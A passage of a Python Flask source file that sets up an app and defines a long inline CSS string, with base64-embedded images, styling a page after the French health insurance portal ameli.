
from flask import Flask,render_template,redirect,url_for
from flask import Markup
app = Flask(__name__, template_folder='')
app.config["CACHE_TYPE"] = "null"




css = Markup("""
.centrepage{
margin:4px;
}

.blocformfond {
background: #EEF5F9; /*#e6e6e6; /*#e6e6e6; /* #D2D2D2; /*#B75190; /* /*#E0F0FF;*/
padding: 5px;
padding-bottom : 20px;
margin: 20px 1px 10px 1px;
line-height: 1.5em;
border: solid 0px lightblue;
clear: both;
}
.blocformfond h2{
color: #0062AD; /*#B75190; */
font-size: 1.2em;
margin: 10px 0px;
padding: 0px;
}
.blocformfond fieldset{
background:white;
border: 1px solid lightblue; /*#B75190; /*#B75190*/
}
.blocformfond fieldset legend{
color: #0062AD; /*#B75190; /* /* /**/
font-size : 1.2em;
padding-left:10px;
padding-right:10px;
position : relative;
display:none;
}
.r_obligatoire {
width: 100%;
margin-bottom: 5px;
text-align : right;
}
.tetiere {
height:85px;
text-align: center;
background-color: white;
}

.tetiere h1 {
float: left;
font-size: 1.8em;
color: white;
padding-left:10px;
font-style:italic;
position: relative;
height: 36px;
}

.tetiere .bandeau {
height: 36px;
background-color:#0057a0;
}

.tetiere .liens {
float: right;
color: white;
height: 36px;
line-height:36px;
padding-right:20px;
position: relative;
}

.tetiere .liens a {
color: white;
text-decoration: none;
padding : 0;
}

.tetiere .logoam {
margin-top: -36px;
border-bottom: 1px solid #ccc;
border-right: 1px solid #ccc;
border-left: 1px solid #ccc;
border-radius: 0 0 10px 10px;
background-color: white;
}
.r_lien_image {
border-bottom: none;
}

.r_lien_image:hover {
border-bottom: none;
}

.wlp-bighorn-footer #Footer
{
  background-color: white;
}

.wlp-bighorn-footer #Footer li a
{
color: white;
}
.wlp-bighorn-window
{
  border-color: #807059;
}

.wlp-bighorn-window-content
{
  /* background-color: white; */
}
.prefooterbody.seul .ameli {
  border-bottom: 1px solid #bfbfbf;
  margin-left: 0;
}
.prefooterbody {
position:relative;
border-top: 1px solid #bfbfbf;
  background-color: #f5f5f5;
}

.prefooterbody li {
background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAYAAAA71pVKAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAG5JREFUeNpiYBgowIhPUnXFAwEgtR6IC29HKFxAl2fCpxmo4QOQegDE+4EGGZBkM5IL5gOpACB2RHYBI7H+w2YAIykBhG4AC5rkfyLNAQWiIgtaADESaXMgffxMdmjj0kgwkUBTmAI2jQMLAAIMAOajNNExrtkZAAAAAElFTkSuQmCC') no-repeat scroll 0 60%;
vertical-align: top;
list-style-type:none;
padding-left:20px;
}

.prefooterbody .legende {
  line-height: 1.7em;
  font-size: 0.9em;
}

.prefooterbody .ameli{
background: url('data:image/png;base64,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') no-repeat scroll 0 0;
padding:15px 0 0 180px;
height:100px;
margin-left:542px;
}

/** Prefooter ameli sur toute la largeur **/
@media only screen and (max-width: 659px) {
.prefooterbody .ameli {
    margin-left:0px;
    padding-top: 15px;
    height: auto;
}
}


.prefooterbody .icone{
position: absolute;
top: -65px;
left: 15px;
}

.prefooterbody .action {
line-height:1.7em;
font-size: 0.9em;
}
.wlp-bighorn-footer #Footer {
margin-top: 20px;
}

.wlp-bighorn-footer #Footer ul {
  list-style-type: none;
  list-style-position: outside;
  margin: 0;
  padding: 0;
  width: 100%;
  display: table;
  height: 50px;
  background-color: #0057a0;
}

.wlp-bighorn-footer #Footer li {
  display: table-cell;
  width: 19.3%;
  margin-right: 0.5%;
  text-align: center;
  position: relative;
